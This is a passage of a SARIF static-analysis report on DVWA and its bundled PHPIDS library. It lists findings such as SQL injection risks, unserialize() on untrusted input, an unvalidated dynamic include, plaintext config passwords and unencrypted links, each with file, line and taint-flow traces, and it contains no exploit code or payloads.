            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Monitor.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Monitor.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4451",
      "message" : {
        "text" : "The file _Report.php.html on line 29 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "39FB676B0CACF3EE2F4627CA45FF531E"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
          },
          "region" : {
            "startLine" : 29,
            "endLine" : 29,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:29"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4452",
      "message" : {
        "text" : "The file _Report.php.html on line 30 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "39FB676B0CACF3EE2F4627CA45FF531F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
          },
          "region" : {
            "startLine" : 30,
            "endLine" : 30,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:30"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4453",
      "message" : {
        "text" : "The file _Report.php.html on line 66 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "39FB676B0CACF3EE2F4627CA45FF5320"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
          },
          "region" : {
            "startLine" : 66,
            "endLine" : 66,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "_Report.php.html:66"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/PHPIDS/_Report.php.html"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4362",
      "message" : {
        "text" : "The file blank.html on line 11 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "00002CEFEB3E732E302A16BE56A3BC55"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/blank.html"
          },
          "region" : {
            "startLine" : 11,
            "endLine" : 11,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "blank.html:11"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/blank.html"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "blank.html:11"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/blank.html"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4398",
      "message" : {
        "text" : "The file classtrees_PHPIDS.html on line 89 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "18D4D720BFF98E28674A935DD5185126"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/classtrees_PHPIDS.html"
          },
          "region" : {
            "startLine" : 89,
            "endLine" : 89,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "classtrees_PHPIDS.html:89"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/classtrees_PHPIDS.html"
                },
                "region" : {
                  "startLine" : 89
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "classtrees_PHPIDS.html:89"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/classtrees_PHPIDS.html"
                },
                "region" : {
                  "startLine" : 89
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4405",
      "message" : {
        "text" : "The file errors.html on line 1430 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "1B4AE331EFAC6FA1AECBB564B8116683"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/errors.html"
          },
          "region" : {
            "startLine" : 1430,
            "endLine" : 1430,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "errors.html:1430"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/errors.html"
                },
                "region" : {
                  "startLine" : 1430
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "errors.html:1430"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/errors.html"
                },
                "region" : {
                  "startLine" : 1430
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4653",
      "message" : {
        "text" : "The file li_PHPIDS.html on line 67 links to a third-party site over an unencrypted channel.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "BEC510FD15E3039AB1B3F6F675ACD163"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/docs/phpdocumentor/li_PHPIDS.html"
          },
          "region" : {
            "startLine" : 67,
            "endLine" : 67,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "li_PHPIDS.html:67"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/li_PHPIDS.html"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "li_PHPIDS.html:67"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/phpdocumentor/li_PHPIDS.html"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4427",
      "message" : {
        "text" : "On line 151 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "283F62F095B86F3A57C56A26658359AD"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
          },
          "region" : {
            "startLine" : 151,
            "endLine" : 151,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:151 - query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 151
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:151 - query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 151
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4513",
      "message" : {
        "text" : "On line 186 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "5F91D7A3BABA220DE15BC95CC8B7E2C5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
          },
          "region" : {
            "startLine" : 186,
            "endLine" : 186,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:186 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 186
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:186 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 186
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4588",
      "message" : {
        "text" : "Line 192 in Database.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "90385E636C7B1AEF4E03C1A3EB68638C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
          },
          "region" : {
            "startLine" : 192,
            "endLine" : 192,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:186 - prepare(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 186
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:192 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 192
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:186 - prepare(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 186
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:186 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 186
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:191 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 191
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:191 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 191
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:192 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 192
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4472",
      "message" : {
        "text" : "On line 248 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "474D5AE95B853E1A2B93D839E577B2C5"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
          },
          "region" : {
            "startLine" : 248,
            "endLine" : 248,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:248 - query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 248
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:248 - query()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 248
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4663",
      "message" : {
        "text" : "On line 250 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
      },
      "level" : "note",
      "partialFingerprints" : {
        "issueInstanceId" : "C6A74AE40C2D1C64029A751B1AF97F9C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
          },
          "region" : {
            "startLine" : 250,
            "endLine" : 250,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Database.php:250 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 250
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Database.php:250 - prepare()"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Database.php"
                },
                "region" : {
                  "startLine" : 250
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4482",
      "message" : {
        "text" : "The file Factory.php passes an unvalidated filename to a dynamic include statement on line 76. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "52DE54E84169B8791741A6836207EC95"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
          },
          "region" : {
            "startLine" : 76,
            "endLine" : 76,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:76 - builtin_includeonce(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - Read $_REQUEST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "ids.php:125 - init^(1->config['Caching']['caching'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/cakephp/ids.php"
                },
                "region" : {
                  "startLine" : 125
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:189 - init^(0->config['Caching']['caching'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 189
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Storage.php:106 - factory(0->config['Caching']['caching'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Filter/Storage.php"
                },
                "region" : {
                  "startLine" : 106
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:69 - ucfirst(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:69 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:66 - Assignment to $wrapper"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:72 - Assignment to $path"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Factory.php:76 - builtin_includeonce(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Caching/Factory.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4517",
      "message" : {
        "text" : "Storing a plain text password in a configuration file may result in a system compromise.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "61E2CE3F27075917E8A14C43D07B5CE3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
          },
          "region" : {
            "startLine" : 63,
            "endLine" : 63,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Config.ini:63 - password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Config.ini:63 - password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4518",
      "message" : {
        "text" : "Storing a plain text password in a configuration file may result in a system compromise.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "61E2CE3F27075917E8A14C43D07B5CE4"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
          },
          "region" : {
            "startLine" : 80,
            "endLine" : 80,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "Config.ini:80 - password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Config.ini:80 - password"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Config/Config.ini"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4367",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "025233C3C389FFADFDA0A962853E2FEB"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:63 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:63 - Read $_GET"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 63
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:61 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 61
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:75 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 75
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPhpIds.inc.php:76 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPhpIds.inc.php"
                },
                "region" : {
                  "startLine" : 76
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:237 - _iterate(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 237
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:259 - _detect(1)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 259
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - runall(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:318 - Assignment to $value"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 318
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:319 - runcentrifuge(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 319
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4478",
      "message" : {
        "text" : "Line 632 in Converter.php calls unserialize() with untrusted data. This call allows the injection of arbitrary PHP objects, which can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "500B9B1CA07DB1A9180679A5394A8A5F"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
          },
          "region" : {
            "startLine" : 632,
            "endLine" : 632,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Converter.php:632 - unserialize(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Converter.php"
                },
                "region" : {
                  "startLine" : 632
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:44 - Read $_POST"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 44
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:41 - Assignment to $request"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 41
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - init^(0 : this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:68 - Assignment to $ids"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "example.php:69 - run(this->request)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/docs/examples/example.php"
                },
                "region" : {
                  "startLine" : 69
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "Monitor.php:236 - each(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "external/phpids/0.6/lib/IDS/Monitor.php"
                },
                "region" : {
                  "startLine" : 236
                }
              }
            }
          }, {
            "location" : {
              "message" : {
